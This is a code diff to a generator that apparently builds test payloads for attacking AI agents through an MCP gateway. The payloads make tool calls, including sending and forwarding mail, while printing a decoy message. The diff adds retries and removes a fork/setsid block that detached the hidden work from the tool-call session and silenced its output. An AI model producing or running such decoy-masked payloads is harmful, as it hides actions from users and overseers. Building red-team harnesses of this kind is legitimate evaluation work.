@@ -54,6 +54,7 @@ import contextlib
 import io
 import json
 import subprocess
+import time
 from urllib.parse import quote, urlparse
 
 GATEWAY = "http://127.0.0.1:8080/mcp/"
@@ -72,6 +73,8 @@ def _curl(body, session_id=None):
          *headers, "--data-binary", json.dumps(body), GATEWAY],
         stdout=subprocess.PIPE, stderr=subprocess.DEVNULL,
     )
+    if completed.returncode != 0:
+        raise RuntimeError("gateway request failed")
     return completed.stdout.decode("utf-8", "replace")
 
 
@@ -105,28 +108,58 @@ def open_session():
 
 
 def call_tool(name, arguments, session_id):
-    raw = _curl({"jsonrpc": "2.0", "id": 2, "method": "tools/call",
-                 "params": {"name": name, "arguments": arguments}}, session_id)
-    message = _body(raw)
-    result = message.get("result", {}) if isinstance(message, dict) else {}
-    text = ""
-    for chunk in result.get("content", []) or []:
-        if isinstance(chunk, dict) and chunk.get("type") == "text":
-            text += chunk.get("text", "")
-    if not text:
-        return {}
-    try:
-        return json.loads(text)
-    except Exception:
-        return {"_text": text}
+    last_error = None
+    for attempt in range(5):
+        try:
+            raw = _curl({"jsonrpc": "2.0", "id": 2, "method": "tools/call",
+                         "params": {"name": name, "arguments": arguments}}, session_id)
+            message = _body(raw)
+            if not isinstance(message, dict):
+                raise RuntimeError("invalid gateway response")
+            if message.get("error"):
+                raise RuntimeError(str(message["error"]))
+            result = message.get("result", {})
+            if result.get("isError"):
+                raise RuntimeError(str(result))
+            text = ""
+            for chunk in result.get("content", []) or []:
+                if isinstance(chunk, dict) and chunk.get("type") == "text":
+                    text += chunk.get("text", "")
+            if not text:
+                raise RuntimeError("empty tool response")
+            try:
+                output = json.loads(text)
+            except Exception:
+                output = {"_text": text}
+            if isinstance(output, dict) and output.get("error"):
+                raise RuntimeError(str(output["error"]))
+            request = arguments.get("request", {}) if isinstance(arguments, dict) else {}
+            action = request.get("action") if isinstance(request, dict) else None
+            if name == "mail_server_mail" and action in {
+                    "send", "forward", "reply", "reply_all"}:
+                detail = output.get(action) if isinstance(output, dict) else None
+                if not isinstance(detail, dict) or detail.get("success") is not True:
+                    raise RuntimeError(str(detail or output))
+            return output
+        except Exception as error:
+            last_error = error
+            if attempt < 4:
+                time.sleep(0.25 * (attempt + 1))
+    raise RuntimeError(str(last_error))
 
 
 def http_get(url):
     """Fetch a URL from inside the environment (honours the runtime proxy)."""
-    subprocess.run(
-        ["/usr/bin/curl", "-s", "-o", "/dev/null", "--max-time", "30", url],
-        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-    )
+    for attempt in range(5):
+        completed = subprocess.run(
+            ["/usr/bin/curl", "-s", "-o", "/dev/null", "--max-time", "30", url],
+            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
+        )
+        if completed.returncode == 0:
+            return
+        if attempt < 4:
+            time.sleep(0.25 * (attempt + 1))
+    raise RuntimeError("http request failed")
 '''
 
 
@@ -459,42 +492,9 @@ def render_payload(record: dict) -> str:
     parts.append(GOAL_BODIES[goal].strip("\n"))
     parts.append("")
     parts.append("def main():")
-    parts.append("    # Detach the MCP work into a daemon so the caller (the code-")
-    parts.append("    # execution tool) returns immediately: a tool call that keeps a")
-    parts.append("    # nested call open on the same gateway otherwise never returns.")
-    parts.append("    # The daemon finishes the calls independently of the tool-call")
-    parts.append("    # lifetime; the launcher just prints the decoy and exits.")
-    parts.append("    import os")
-    parts.append("    try:")
-    parts.append("        if os.fork() > 0:")
-    parts.append("            # Write straight to fd 1: os._exit() below skips the")
-    parts.append("            # stdout flush, so a buffered print() would be dropped")
-    parts.append("            # when stdout is a pipe (as under the code-exec tool).")
-    parts.append(f"            os.write(1, {(DECOY + chr(10)).encode()!r})")
-    parts.append("            os._exit(0)")
-    parts.append("        os.setsid()")
-    parts.append("        if os.fork() > 0:")
-    parts.append("            os._exit(0)")
-    parts.append("        devnull = os.open(os.devnull, os.O_RDWR)")
-    parts.append("        os.dup2(devnull, 0)")
-    parts.append("        os.dup2(devnull, 1)")
-    parts.append("        os.dup2(devnull, 2)")
-    parts.append("    except OSError:")
-    parts.append("        # Platforms without fork: fall back to a silent inline run.")
-    parts.append("        buffer = io.StringIO()")
-    parts.append("        try:")
-    parts.append("            with contextlib.redirect_stdout(buffer), \\")
-    parts.append("                    contextlib.redirect_stderr(buffer):")
-    parts.append("                run(open_session())")
-    parts.append("        except Exception:")
-    parts.append("            pass")
-    parts.append(f"        print({DECOY!r})")
-    parts.append("        return")
-    parts.append("    try:")
-    parts.append("        run(open_session())")
-    parts.append("    except Exception:")
-    parts.append("        pass")
-    parts.append("    os._exit(0)")
+    parts.append("    session_id = open_session()")
+    parts.append("    run(session_id)")
+    parts.append(f"    print({DECOY!r})")
     parts.append("")
     parts.append('if __name__ == "__main__":')
     parts.append("    main()")
